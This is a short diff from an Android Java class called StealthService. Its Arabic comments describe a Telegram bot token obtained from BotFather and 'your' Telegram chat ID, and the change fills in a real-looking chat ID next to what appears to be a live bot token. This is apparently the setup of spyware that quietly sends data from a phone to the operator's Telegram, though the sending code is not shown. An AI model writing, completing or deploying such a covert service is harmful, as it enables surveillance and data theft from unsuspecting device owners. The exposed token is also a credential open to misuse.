@@ -22,7 +22,7 @@ public class StealthService extends Service {
     // الـ Token بتاع البوت اللي طلعناه من BotFather
     private static final String BOT_TOKEN = "9185552010:AAEWWxz3ovVN1p2_3jF12dZxqVYqblMKzug";
     // الـ Chat ID بتاع حسابك على تيليجرام
-    private static final String CHAT_ID = "حط_الـ_شات_آي دي_هنا";
+    private static final String CHAT_ID = "8890292449";
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
